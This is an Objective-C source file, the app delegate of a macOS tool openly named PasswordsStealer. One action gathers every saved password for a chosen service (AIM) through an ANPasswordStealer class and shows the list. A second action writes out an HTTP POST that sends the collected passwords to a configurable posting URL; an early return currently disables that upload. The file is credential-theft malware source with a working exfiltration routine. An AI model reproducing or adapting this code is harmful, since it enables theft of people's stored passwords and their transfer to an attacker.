//
//  PasswordsStealerAppDelegate.m
//  PasswordsStealer
//
//  Created by Alex Nichol on 5/3/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PasswordsStealerAppDelegate.h"
#import "ANPasswordStealer.h"

@implementation PasswordsStealerAppDelegate

@synthesize window;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
	// Insert code here to initialize your application
}

- (IBAction)uploadPasswords:(id)sender {
	NSRunAlertPanel(@"Not Configured", @"This executable was not configured with a path to a password posting URL.", @"OK", nil, nil);
	return;
	NSString * postString = [passwordsBox string];
	NSData * postData = [postString dataUsingEncoding:NSUTF8StringEncoding];
	NSURL * url = [NSURL URLWithString:kPasswordPostingURL];
	NSMutableURLRequest * request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
	[request setHTTPBody:postData];
	[request setValue:[NSString stringWithFormat:@"%d", [postData length]] forHTTPHeaderField:@"Content-Length"];
	[request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
	[request setHTTPMethod:@"POST"];
	NSData * newData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
	if (!newData) {
		NSRunAlertPanel(@"Failed", @"There was an error posting the data.", @"OK", nil, nil);
	} else {
		NSRunAlertPanel(@"Posted", @"It was posted successfully.", @"OK", nil, nil);
	}
}

- (IBAction)stealPasswords:(id)sender {
	NSString * title = [serviceType titleOfSelectedItem];
	NSString * type = nil;
	if ([title isEqual:@"AIM"]) type = @"AIM";
	ANPasswordStealer * stealer = [[ANPasswordStealer alloc] initWithService:type];
	NSArray * items = [stealer allPasswords];
	NSMutableString * string = [NSMutableString string];
	for (ANAccount * acc in items) {
		[string appendFormat:@"%@\n", acc];
	}
	[passwordsBox setString:string];
	[stealer release];
}

@end
